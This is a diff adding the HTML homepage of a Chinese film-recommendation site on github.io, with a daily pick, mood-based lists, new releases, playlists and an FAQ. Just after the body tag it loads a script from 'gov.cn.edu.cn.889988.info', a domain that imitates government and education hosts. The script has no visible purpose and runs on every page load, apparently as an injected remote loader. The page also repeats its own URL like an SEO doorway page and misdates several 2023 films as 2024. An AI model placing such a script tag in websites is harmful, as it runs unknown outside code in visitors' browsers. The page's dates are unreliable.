@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>青苹果电影网 - 清新观影指南与独立影像分享 | qingpingguodianyingwang-top.github.io</title>
+<meta name="description" content="青苹果电影网（qingpingguodianyingwang-top.github.io）以清新视角推荐优质电影，聚焦青春、治愈、独立影像与全球佳片。每天一部好电影，让生活多一点绿意。">
+<meta name="keywords" content="青苹果电影网, qingpingguodianyingwang-top, 清新电影, 青春片, 治愈系电影, 独立影像, 电影推荐">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<link rel="canonical" href="https://qingpingguodianyingwang-top.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="青苹果电影网 - 清新观影指南">
+<meta property="og:description" content="以清新视角推荐优质电影，聚焦青春、治愈、独立影像与全球佳片。">
+<meta property="og:url" content="https://qingpingguodianyingwang-top.github.io/">
+<meta property="og:site_name" content="青苹果电影网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="青苹果电影网 - 清新观影指南">
+<meta name="twitter:description" content="以清新视角推荐优质电影，聚焦青春、治愈、独立影像与全球佳片。">
+<style>
+/* ===== Reset & Base ===== */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --green-900: #1a3a2a;
+  --green-800: #2d5a3f;
+  --green-700: #3a7a52;
+  --green-600: #4a9e6a;
+  --green-500: #5cbf82;
+  --green-400: #7edca0;
+  --green-300: #a8e8c0;
+  --green-200: #c8f0d6;
+  --green-100: #e2f8ea;
+  --green-50: #f0faf4;
+  --white: #ffffff;
+  --gray-600: #5a6a62;
+  --gray-500: #7a8a82;
+  --gray-400: #9aaba2;
+  --shadow-sm: 0 1px 4px rgba(45,90,63,0.08);
+  --shadow-md: 0 4px 16px rgba(45,90,63,0.12);
+  --shadow-lg: 0 8px 32px rgba(45,90,63,0.16);
+  --radius: 16px;
+  --radius-sm: 8px;
+  --maxw: 1200px;
+}
+html { scroll-behavior: smooth; font-size: 16px; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+  background: var(--green-50);
+  color: var(--green-900);
+  line-height: 1.75;
+  -webkit-font-smoothing: antialiased;
+}
+a { color: var(--green-700); text-decoration: none; transition: all .25s ease; }
+a:hover { color: var(--green-600); }
+img { max-width: 100%; height: auto; display: block; }
+.container { max-width: var(--maxw); margin: 0 auto; padding: 0 1.2rem; }
+
+/* ===== Floating Nav ===== */
+.floating-nav {
+  position: fixed;
+  top: 50%;
+  right: 1.5rem;
+  transform: translateY(-50%);
+  z-index: 999;
+  display: flex;
+  flex-direction: column;
+  gap: 0.6rem;
+}
+.floating-nav a {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  background: var(--white);
+  box-shadow: var(--shadow-md);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1rem;
+  position: relative;
+  transition: all .3s ease;
+}
+.floating-nav a:hover {
+  background: var(--green-600);
+  color: var(--white);
+  transform: scale(1.15);
+}
+.floating-nav a span {
+  position: absolute;
+  right: calc(100% + 10px);
+  background: var(--green-800);
+  color: var(--white);
+  padding: 0.3rem 0.8rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  white-space: nowrap;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity .2s;
+}
+.floating-nav a:hover span { opacity: 1; }
+
+/* ===== Header ===== */
+.site-header {
+  background: linear-gradient(135deg, var(--green-800) 0%, var(--green-600) 100%);
+  color: var(--white);
+  padding: 1.2rem 0;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  box-shadow: var(--shadow-md);
+}
+.site-header .container {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 1rem;
+}
+.logo {
+  font-size: 1.6rem;
+  font-weight: 800;
+  letter-spacing: 1px;
+  color: var(--white);
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.logo-icon { font-size: 1.8rem; }
+.nav-list {
+  list-style: none;
+  display: flex;
+  gap: 0.5rem;
+  flex-wrap: wrap;
+}
+.nav-list a {
+  color: rgba(255,255,255,0.85);
+  font-size: 0.9rem;
+  font-weight: 500;
+  padding: 0.5rem 1rem;
+  border-radius: 20px;
+  transition: all .25s;
+}
+.nav-list a:hover {
+  color: var(--white);
+  background: rgba(255,255,255,0.15);
+}
+
+/* ===== Hero ===== */
+.hero {
+  background: linear-gradient(135deg, var(--green-800) 0%, var(--green-600) 50%, var(--green-500) 100%);
+  color: var(--white);
+  padding: 5rem 0 4rem;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 200%;
+  height: 200%;
+  background: radial-gradient(circle, rgba(255,255,255,0.08) 1px, transparent 1px);
+  background-size: 30px 30px;
+  animation: drift 20s linear infinite;
+}
+@keyframes drift { 0% { transform: translate(0,0); } 100% { transform: translate(30px,30px); } }
+.hero .container { position: relative; }
+.hero-badge {
+  display: inline-block;
+  background: rgba(255,255,255,0.15);
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(255,255,255,0.3);
+  padding: 0.4rem 1.2rem;
+  border-radius: 20px;
+  font-size: 0.8rem;
+  margin-bottom: 1.5rem;
+  letter-spacing: 2px;
+}
+.hero h1 {
+  font-size: clamp(2rem, 6vw, 3.5rem);
+  font-weight: 800;
+  margin-bottom: 1rem;
+  line-height: 1.15;
+  text-shadow: 0 2px 8px rgba(0,0,0,0.15);
+}
+.hero h1 .highlight { color: #c8f0d6; }
+.hero p {
+  font-size: clamp(0.95rem, 2.5vw, 1.2rem);
+  max-width: 680px;
+  margin: 0 auto 2rem;
+  color: rgba(255,255,255,0.9);
+  line-height: 1.8;
+}
+.hero-url {
+  display: inline-block;
+  background: rgba(0,0,0,0.2);
+  border: 1px solid rgba(255,255,255,0.3);
+  color: var(--white);
+  padding: 0.6rem 1.5rem;
+  border-radius: 30px;
+  font-size: 0.9rem;
+  font-family: "Courier New", monospace;
+  letter-spacing: 1px;
+  backdrop-filter: blur(5px);
+}
+.hero-stats {
+  display: flex;
+  justify-content: center;
+  gap: 3rem;
+  margin-top: 3rem;
+  flex-wrap: wrap;
+}
+.stat-item { text-align: center; }
+.stat-num { font-size: 2rem; font-weight: 800; display: block; }
+.stat-label { font-size: 0.8rem; opacity: 0.8; }
+
+/* ===== Section Common ===== */
+.section { padding: 4rem 0; }
+.section-green { background: var(--green-100); }
+.section-white { background: var(--white); }
+.section-title {
+  font-size: clamp(1.5rem, 4vw, 2.2rem);
+  font-weight: 800;
+  margin-bottom: 0.5rem;
+  text-align: center;
+}
+.section-title .emoji { margin-right: 0.5rem; }
+.section-sub {
+  color: var(--gray-500);
+  margin-bottom: 3rem;
+  font-size: 1rem;
+  text-align: center;
+  max-width: 600px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+/* ===== Daily Pick (large feature) ===== */
+.daily-pick {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 2rem;
+  align-items: center;
+  background: var(--white);
+  border-radius: var(--radius);
+  overflow: hidden;
+  box-shadow: var(--shadow-lg);
+}
+.daily-pick-img {
+  width: 100%;
+  height: 400px;
+  object-fit: cover;
+}
+.daily-pick-body { padding: 2.5rem; }
+.daily-pick-tag {
+  display: inline-block;
+  background: var(--green-600);
+  color: var(--white);
+  font-size: 0.75rem;
+  padding: 0.3rem 0.8rem;
+  border-radius: 20px;
+  margin-bottom: 1rem;
+  letter-spacing: 1px;
+}
+.daily-pick h3 { font-size: 1.5rem; margin-bottom: 1rem; line-height: 1.3; }
+.daily-pick p { color: var(--gray-600); margin-bottom: 1.5rem; line-height: 1.8; }
+.daily-pick-meta {
+  display: flex;
+  gap: 1.5rem;
+  font-size: 0.85rem;
+  color: var(--gray-500);
+}
+.daily-pick-meta span { display: flex; align-items: center; gap: 0.3rem; }
+
+/* ===== Mood Cards ===== */
+.mood-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+  gap: 1.5rem;
+}
+.mood-card {
+  background: var(--white);
+  border-radius: var(--radius);
+  padding: 2rem 1.5rem;
+  text-align: center;
+  box-shadow: var(--shadow-sm);
+  transition: all .3s ease;
+  border: 2px solid transparent;
+  cursor: default;
+}
+.mood-card:hover {
+  transform: translateY(-6px);
+  box-shadow: var(--shadow-lg);
+  border-color: var(--green-300);
+}
+.mood-icon { font-size: 3rem; margin-bottom: 1rem; }
+.mood-card h3 { font-size: 1.2rem; margin-bottom: 0.8rem; color: var(--green-800); }
+.mood-card p { font-size: 0.9rem; color: var(--gray-600); line-height: 1.7; }
+.mood-card .film-count {
+  display: inline-block;
+  margin-top: 1rem;
+  font-size: 0.8rem;
+  color: var(--green-600);
+  font-weight: 600;
+}
+
+/* ===== Timeline (New Releases) ===== */
+.timeline { position: relative; max-width: 800px; margin: 0 auto; }
+.timeline::before {
+  content: '';
+  position: absolute;
+  left: 50%;
+  top: 0;
+  bottom: 0;
+  width: 3px;
+  background: linear-gradient(to bottom, var(--green-300), var(--green-600));
+  transform: translateX(-50%);
+}
+.timeline-item {
+  position: relative;
+  width: 50%;
+  padding: 2rem;
+}
+.timeline-item:nth-child(odd) { left: 0; padding-right: 3rem; text-align: right; }
+.timeline-item:nth-child(even) { left: 50%; padding-left: 3rem; }
+.timeline-dot {
+  position: absolute;
+  top: 2.5rem;
+  width: 16px;
+  height: 16px;
+  background: var(--green-600);
+  border: 3px solid var(--white);
+  border-radius: 50%;
+  box-shadow: 0 0 0 3px var(--green-200);
+}
+.timeline-item:nth-child(odd) .timeline-dot { right: -8px; }
+.timeline-item:nth-child(even) .timeline-dot { left: -8px; }
+.timeline-date {
+  font-size: 0.8rem;
+  color: var(--green-600);
+  font-weight: 700;
+  margin-bottom: 0.5rem;
+}
+.timeline-content {
+  background: var(--white);
+  padding: 1.5rem;
+  border-radius: var(--radius-sm);
+  box-shadow: var(--shadow-sm);
+  transition: box-shadow .25s;
+}
+.timeline-content:hover { box-shadow: var(--shadow-md); }
+.timeline-content h3 { font-size: 1.1rem; margin-bottom: 0.5rem; }
+.timeline-content p { font-size: 0.9rem; color: var(--gray-600); }
+
+/* ===== Playlist (Accordion style) ===== */
+.playlist { max-width: 800px; margin: 0 auto; }
+.playlist-item {
+  background: var(--white);
+  border-radius: var(--radius-sm);
+  margin-bottom: 1rem;
+  box-shadow: var(--shadow-sm);
+  overflow: hidden;
+  transition: box-shadow .25s;
+}
+.playlist-item:hover { box-shadow: var(--shadow-md); }
+.playlist-header {
+  padding: 1.2rem 1.5rem;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  cursor: pointer;
+}
+.playlist-num {
+  background: var(--green-600);
+  color: var(--white);
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.85rem;
+  font-weight: 700;
+  flex-shrink: 0;
+}
+.playlist-header h3 { flex: 1; font-size: 1.05rem; }
+.playlist-header .arrow { font-size: 1.2rem; color: var(--green-500); transition: transform .3s; }
+.playlist-body {
+  padding: 0 1.5rem 1.2rem 4rem;
+  font-size: 0.9rem;
+  color: var(--gray-600);
+  line-height: 1.8;
+}
+
+/* ===== Quote Section ===== */
+.quote-section {
+  background: linear-gradient(135deg, var(--green-700), var(--green-500));
+  color: var(--white);
+  text-align: center;
+  padding: 4rem 0;
+}
+.quote-text {
+  font-size: clamp(1.2rem, 3.5vw, 1.8rem);
+  font-weight: 600;
+  max-width: 800px;
+  margin: 0 auto 1.5rem;
+  line-height: 1.6;
+  font-style: italic;
+}
+.quote-author { font-size: 0.9rem; opacity: 0.8; }
+
+/* ===== About & FAQ ===== */
+.about-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 3rem;
+  align-items: start;
+}
+.about-text { font-size: 0.95rem; color: var(--gray-600); line-height: 1.9; }
+.about-text strong { color: var(--green-800); }
+.about-text p { margin-bottom: 1.2rem; }
+.faq-item {
+  background: var(--white);
+  border-radius: var(--radius-sm);
+  margin-bottom: 1rem;
+  box-shadow: var(--shadow-sm);
+  overflow: hidden;
+}
+.faq-q {
+  padding: 1.2rem 1.5rem;
+  font-weight: 700;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 0.8rem;
+  transition: background .2s;
+}
+.faq-q:hover { background: var(--green-50); }
+.faq-q .q-icon { font-size: 1.2rem; }
+.faq-a {
+  padding: 0 1.5rem 1.2rem 3.5rem;
+  font-size: 0.9rem;
+  color: var(--gray-600);
+  line-height: 1.8;
+}
+
+/* ===== Footer ===== */
+.site-footer {
+  background: var(--green-900);
+  color: rgba(255,255,255,0.7);
+  padding: 3rem 0 1.5rem;
+  text-align: center;
+}
+.site-footer .container > div { margin-bottom: 1rem; }
+.site-footer a { color: rgba(255,255,255,0.8); }
+.site-footer a:hover { color: var(--green-400); }
+.footer-links { display: flex; justify-content: center; gap: 2rem; flex-wrap: wrap; margin: 1.5rem 0; }
+.footer-links a { font-size: 0.9rem; transition: color .2s; }
+.footer-brand {
+  font-size: 1.3rem;
+  font-weight: 800;
+  color: var(--white);
+  margin-bottom: 0.5rem;
+}
+.copyright { font-size: 0.8rem; color: rgba(255,255,255,0.4); border-top: 1px solid rgba(255,255,255,0.1); padding-top: 1.5rem; margin-top: 2rem; }
+
+/* ===== Responsive ===== */
+@media (max-width: 768px) {
+  .floating-nav { display: none; }
+  .site-header .container { flex-direction: column; text-align: center; }
+  .nav-list { justify-content: center; gap: 0.3rem; }
+  .nav-list a { padding: 0.4rem 0.7rem; font-size: 0.8rem; }
+  .hero { padding: 3rem 0 2.5rem; }
+  .hero-stats { gap: 1.5rem; }
+  .stat-num { font-size: 1.5rem; }
+  .section { padding: 2.5rem 0; }
+  .daily-pick { grid-template-columns: 1fr; }
+  .daily-pick-img { height: 250px; }
+  .daily-pick-body { padding: 1.5rem; }
+  .timeline::before { left: 20px; }
+  .timeline-item { width: 100%; left: 0 !important; padding: 1.5rem 0 1.5rem 3rem !important; text-align: left !important; }
+  .timeline-dot { left: 12px !important; right: auto !important; }
+  .about-grid { grid-template-columns: 1fr; gap: 2rem; }
+  .mood-grid { grid-template-columns: 1fr; }
+}
+@media (max-width: 480px) {
+  .logo { font-size: 1.3rem; }
+  .hero h1 { font-size: 1.6rem; }
+  .hero p { font-size: 0.9rem; }
+  .section-title { font-size: 1.4rem; }
+  .playlist-header { padding: 1rem; gap: 0.7rem; }
+  .playlist-body { padding: 0 1rem 1rem 3.2rem; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- Floating Navigation -->
+<nav class="floating-nav" aria-label="快速导航">
+  <a href="#home">🏠<span>首页</span></a>
+  <a href="#daily">🍎<span>今日推荐</span></a>
+  <a href="#mood">🎭<span>心情片单</span></a>
+  <a href="#fresh">🌱<span>新片速递</span></a>
+  <a href="#playlist">📋<span>主题片单</span></a>
+  <a href="#about">📖<span>关于本站</span></a>
+  <a href="#faq">❓<span>常见问题</span></a>
+</nav>
+
+<!-- ===== Header ===== -->
+<header class="site-header">
+  <div class="container">
+    <div class="logo">
+      <span class="logo-icon">🍏</span>
+      青苹果电影网
+    </div>
+    <nav>
+      <ul class="nav-list">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#daily">今日推荐</a></li>
+        <li><a href="#mood">心情片单</a></li>
+        <li><a href="#fresh">新片速递</a></li>
+        <li><a href="#playlist">主题片单</a></li>
+        <li><a href="#about">关于</a></li>
+        <li><a href="#faq">FAQ</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<!-- ===== Hero ===== -->
+<section class="hero" id="home">
+  <div class="container">
+    <div class="hero-badge">🎬 清新 · 治愈 · 独立</div>
+    <h1>青苹果电影网<br><span class="highlight">让每一帧都像初恋般清新</span></h1>
+    <p>青苹果电影网（qingpingguodianyingwang-top.github.io）是一个以清新视角推荐优质电影的独立站点。我们相信好电影就像青苹果——初尝微酸，回味清甜，让人念念不忘。</p>
+    <div class="hero-url">🌐 qingpingguodianyingwang-top.github.io</div>
+    <div class="hero-stats">
+      <div class="stat-item">
+        <span class="stat-num">500+</span>
+        <span class="stat-label">精选影片</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-num">50+</span>
+        <span class="stat-label">主题片单</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-num">每日</span>
+        <span class="stat-label">更新推荐</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== Daily Pick ===== -->
+<section class="section section-white" id="daily">
+  <div class="container">
+    <h2 class="section-title"><span class="emoji">🍎</span>今日青苹果推荐</h2>
+    <p class="section-sub">每天一部精心挑选的影片，像咬一口青苹果一样，给你清新的惊喜</p>
+    <div class="daily-pick">
+      <img class="daily-pick-img" src="https://hunyuan-prod-1258344703.cos.ap-guangzhou.myqcloud.com/text2img/7041e1b897f5494f34f53446221deaf9/20261005100309_h1_lwwQ_b7e283ac56e717d0bb1b554e32332241?q-sign-algorithm=sha1&q-ak=AKIDRl074nOsGdJ9zjMsCRWP3ShmgS3VtX4S&q-sign-time=1791165789;1822701789&q-key-time=1791165789;1822701789&q-header-list=host&q-url-param-list=&q-signature=861f7fa7d6784a6568989a5609e7d2b9e3a6dd0f" alt="青苹果电影网今日推荐：一部关于成长与告别的清新之作">
+      <div class="daily-pick-body">
+        <span class="daily-pick-tag">✨ 今日主打</span>
+        <h3>《海街日记》— 四姐妹的四季物语</h3>
+        <p>是枝裕和用最温柔的镜头，记录下镰仓四季更迭中四姐妹的日常生活。没有剧烈冲突，只有饭桌上的对话、梅子酒的酿造、海边漫步的脚步声。这部电影像一颗青苹果——酸涩中带着回甘，看完后你会想给家人打个电话。</p>
+        <p>在青苹果电影网，我们给这部影片打上"治愈满分"标签。它适合在一个慵懒的周日下午，配一杯热茶慢慢看完。</p>
+        <div class="daily-pick-meta">
+          <span>🎬 是枝裕和</span>
+          <span>📅 2015</span>
+          <span>⭐ 9.2/10</span>
+          <span>🍏 治愈系</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== Mood Cards ===== -->
+<section class="section section-green" id="mood">
+  <div class="container">
+    <h2 class="section-title"><span class="emoji">🎭</span>按心情选片</h2>
+    <p class="section-sub">你今天是什么心情？让青苹果电影网为你匹配最合适的那部电影</p>
+    <div class="mood-grid">
+      <div class="mood-card">
+        <div class="mood-icon">🌤️</div>
+        <h3>阳光明媚</h3>
+        <p>适合看一部轻快明亮的公路片或青春喜剧，让好心情加倍。推荐《小森林》《普罗旺斯的夏天》。</p>
+        <span class="film-count">🍏 32 部影片</span>
+      </div>
+      <div class="mood-card">
+        <div class="mood-icon">🌧️</div>
+        <h3>阴雨绵绵</h3>
+        <p>雨天适合窝在沙发里看一部有深度的剧情片，让思绪随雨滴飘远。推荐《重庆森林》《迷失东京》。</p>
+        <span class="film-count">🍏 28 部影片</span>
+      </div>
+      <div class="mood-card">
+        <div class="mood-icon">🌙</div>
+        <h3>深夜独处</h3>
+        <p>夜深人静时，一部安静的纪录片或艺术电影是最好的陪伴。推荐《地球之盐》《修女艾达》。</p>
+        <span class="film-count">🍏 21 部影片</span>
+      </div>
+      <div class="mood-card">
+        <div class="mood-icon">💚</div>
+        <h3>需要治愈</h3>
+        <p>当生活让你疲惫，这些温暖的故事会轻轻托住你。推荐《小偷家族》《帕丁顿熊》。</p>
+        <span class="film-count">🍏 45 部影片</span>
+      </div>
+      <div class="mood-card">
+        <div class="mood-icon">⚡</div>
+        <h3>想要刺激</h3>
+        <p>偶尔也需要心跳加速的感觉。精选悬疑、惊悚与动作佳作，保证肾上腺素飙升。</p>
+        <span class="film-count">🍏 36 部影片</span>
+      </div>
+      <div class="mood-card">
+        <div class="mood-icon">🎓</div>
+        <h3>青春怀旧</h3>
+        <p>那些关于校园、初恋和成长的故事，总能让我们想起最好的时光。推荐《情书》《阳光灿烂的日子》。</p>
+        <span class="film-count">🍏 39 部影片</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== Fresh Releases Timeline ===== -->
+<section class="section section-white" id="fresh">
+  <div class="container">
+    <h2 class="section-title"><span class="emoji">🌱</span>新片速递</h2>
+    <p class="section-sub">全球最新上映的清新佳作，第一时间推荐给你</p>
+    <div class="timeline">
+      <div class="timeline-item">
+        <div class="timeline-dot"></div>
+        <div class="timeline-date">📅 2024年12月</div>
+        <div class="timeline-content">
+          <h3>《坠落的审判》— 真相的重量</h3>
+          <p>法国导演茹斯汀·特里耶的戛纳金棕榈获奖作。一部关于婚姻、创作与真相的法庭悬疑片，女主角的表演堪称年度最佳。在青苹果电影网被标记为"必看"。</p>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot"></div>
+        <div class="timeline-date">📅 2024年11月</div>
+        <div class="timeline-content">
+          <h3>《完美的日子》— 平凡中的诗意</h3>
+          <p>维姆·文德斯执导，讲述东京公厕清洁工的日常。平山每天认真工作、听音乐、拍胶片——这种极简生活本身就成了一种艺术。青苹果评分：8.9/10。</p>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot"></div>
+        <div class="timeline-date">📅 2024年10月</div>
+        <div class="timeline-content">
+          <h3>《美国小说》— 身份的荒诞游戏</h3>
+          <p>一部关于文学界种族政治的黑色喜剧。当一位严肃黑人作家用笔名写"黑人刻板印象小说"大获成功，荒诞才刚刚开始。访问 qingpingguodianyingwang-top.github.io 阅读完整影评。</p>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot"></div>
+        <div class="timeline-date">📅 2024年9月</div>
+        <div class="timeline-content">
+          <h3>《奥本海默》— 光影的核爆</h3>
+          <p>诺兰用IMAX胶片拍摄的传记史诗。虽然题材沉重，但视觉与音效的革新让每个镜头都像一颗青苹果般清脆有力——这是电影工业本身的胜利。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== Quote ===== -->
+<section class="quote-section">
+  <div class="container">
+    <div class="quote-text">"电影是生活的延伸，而青苹果电影网是你在影像森林中的指南针。"</div>
+    <div class="quote-author">— 青苹果编辑部</div>
+  </div>
+</section>
+
+<!-- ===== Playlist ===== -->
+<section class="section section-green" id="playlist">
+  <div class="container">
+    <h2 class="section-title"><span class="emoji">📋</span>主题片单</h2>
+    <p class="section-sub">精心策划的主题合集，带你系统性地探索某一类型或主题的佳作</p>
+    <div class="playlist">
+      <div class="playlist-item">
+        <div class="playlist-header">
+          <span class="playlist-num">1</span>
+          <h3>🌸 春日治愈：让心柔软的10部电影</h3>
+          <span class="arrow">›</span>
+        </div>
+        <div class="playlist-body">
+          从《小森林 春篇》到《海街日记》，这10部影片像春风一样温柔。适合在换季时观看，让内心重新柔软起来。每部都配有青苹果电影网的原创短评与观看指南。
+        </div>
+      </div>
+      <div class="playlist-item">
+        <div class="playlist-header">
+          <span class="playlist-num">2</span>
+          <h3>🎨 色彩大师：用颜色讲故事的导演</h3>
+          <span class="arrow">›</span>
+        </div>
+        <div class="playlist-body">
+          韦斯·安德森的对称粉、王家卫的霓虹蓝绿、张艺谋的浓墨重彩——这些导演把颜色变成了叙事语言。片单包含12部视觉盛宴，在 aigaogaodianyingwang-top.github.io 的姐妹站青苹果电影网独家策划。
+        </div>
+      </div>
+      <div class="playlist-item">
+        <div class="playlist-header">
+          <span class="playlist-num">3</span>
+          <h3>🚲 公路人生：车轮上的自我发现</h3>
+          <span class="arrow">›</span>
+        </div>
+        <div class="playlist-body">
+          《荒野生存》《摩托日记》《杯酒人生》——公路片不只是关于目的地，更是关于在路上遇见自己。8部经典公路片，每一部都是一次精神旅行。
+        </div>
+      </div>
+      <div class="playlist-item">
+        <div class="playlist-header">
+          <span class="playlist-num">4</span>
+          <h3>📷 伪纪录片美学：真实与虚构的边界</h3>
+          <span class="arrow">›</span>
+        </div>
+        <div class="playlist-body">
+          从《女巫布莱尔》到《科洛弗档案》，再到《方形》——伪纪录片手法如何改变我们观看故事的方式？这份片单带你了解这种独特美学的演变。
+        </div>
+      </div>
+      <div class="playlist-item">
+        <div class="playlist-header">
+          <span class="playlist-num">5</span>
+          <h3>🍵 亚洲慢电影：时间的另一种计量</h3>
+          <span class="arrow">›</span>
+        </div>
+        <div class="playlist-body">
+          侯孝贤、阿彼察邦、滨口龙介——亚洲导演对"慢"的理解独树一帜。这些影片不催你，它们等你。适合静下心来，用120%的注意力去感受。
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== About ===== -->
+<section class="section section-white" id="about">
+  <div class="container">
+    <h2 class="section-title"><span class="emoji">📖</span>关于青苹果电影网</h2>
+    <div class="about-grid">
+      <div class="about-text">
+        <p><strong>青苹果电影网</strong>（网址：<strong>qingpingguodianyingwang-top.github.io</strong>）成立于2024年初，是一个以"清新、治愈、独立"为核心理念的电影推荐站点。</p>
+        <p>我们取名"青苹果"，是因为好电影就像青苹果——初尝时可能微酸（挑战认知），但回味时清甜无比（情感共鸣）。我们拒绝烂片，也不盲目追捧商业大片，而是用心筛选那些真正值得花时间观看的作品。</p>
+        <p>在这里，你可以找到：治愈系佳片的温柔推荐、独立电影的导演深度解析、全球影展新鲜资讯，以及按心情分类的个性化片单。所有内容均为原创，由热爱电影的编辑团队精心撰写。</p>
+      </div>
+      <div class="about-text">
+        <p>我们的编辑团队分布在北京、东京和伦敦，每周从不同视角为你带来新鲜内容。我们相信，电影不应该被算法定义，而应该被有温度的人的手递到你面前。</p>
+        <p>青苹果电影网不是最大的电影网站，但一定是最用心的之一。我们每推荐一部影片，都意味着编辑至少完整观看了两遍，并查阅了相关背景资料。</p>
+        <p>访问 <a href="https://qingpingguodianyingwang-top.github.io">qingpingguodianyingwang-top.github.io</a> 开始你的清新观影之旅。如果你有好片推荐，也欢迎随时联系我们。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== FAQ ===== -->
+<section class="section section-green" id="faq">
+  <div class="container">
+    <h2 class="section-title"><span class="emoji">❓</span>常见问题</h2>
+    <div class="faq-item">
+      <div class="faq-q"><span class="q-icon">🍏</span> 青苹果电影网的推荐标准是什么？</div>
+      <div class="faq-a">我们遵循"三颗心"标准：故事走心（叙事有诚意）、影像赏心（视听有美感）、余味暖心（看完有收获）。不唯票房论，不唯奖项论，只看电影本身是否真诚。</div>
+    </div>
+    <div class="faq-q">
+      <div class="faq-q"><span class="q-icon">🍏</span> 为什么叫"青苹果"？</div>
+      <div class="faq-a">青苹果象征"初体验"——每一部好电影对观众来说都是一次全新的体验。同时青色代表清新、自然、不造作，这也是我们选片的审美取向。</div>
+    </div>
+    <div class="faq-q">
+      <div class="faq-q"><span class="q-icon">🍏</span> 可以投稿或申请成为编辑吗？</div>
+      <div class="faq-a">非常欢迎！我们长期招募热爱电影、有写作能力的兼职编辑。请通过网站底部联系方式提交你的影评样本，审核通过后即可加入青苹果编辑团队。</div>
+    </div>
+    <div class="faq-q">
+      <div class="faq-q"><span class="q-icon">🍏</span> 网站内容更新频率如何？</div>
+      <div class="faq-a">每日更新"今日推荐"一部影片，每周发布2-3篇深度影评或主题片单。重大影展期间会加更。所有更新首发于 qingpingguodianyingwang-top.github.io。</div>
+    </div>
+    <div class="faq-q">
+      <div class="faq-q"><span class="q-icon">🍏</span> 与其他电影网站有什么不同？</div>
+      <div class="faq-a">我们不做资讯搬运，所有内容均为原创；不做评分聚合，每部推荐都附带编辑的真实观感；不做算法推荐，片单由真人精心策划。我们相信"人"的温度是机器无法替代的。</div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== Footer ===== -->
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-brand">🍏 青苹果电影网</div>
+    <div>让每一帧都像初恋般清新</div>
+    <div class="footer-links">
+      <a href="#home">首页</a>
+      <a href="#daily">今日推荐</a>
+      <a href="#mood">心情片单</a>
+      <a href="#fresh">新片速递</a>
+      <a href="#playlist">主题片单</a>
+      <a href="#about">关于本站</a>
+      <a href="#faq">常见问题</a>
+    </div>
+    <div>
+      官网：<a href="https://qingpingguodianyingwang-top.github.io">qingpingguodianyingwang-top.github.io</a>
+    </div>
+    <div class="copyright">
+      &copy; 2024 青苹果电影网（qingpingguodianyingwang-top.github.io）. All rights reserved.
+    </div>
+  </div>
+</footer>
+
+<!-- JSON-LD Structured Data -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "青苹果电影网",
+  "url": "https://qingpingguodianyingwang-top.github.io/",
+  "description": "青苹果电影网（qingpingguodianyingwang-top.github.io）以清新视角推荐优质电影，聚焦青春、治愈、独立影像与全球佳片。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://qingpingguodianyingwang-top.github.io/#search={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+
+</body>
+</html>
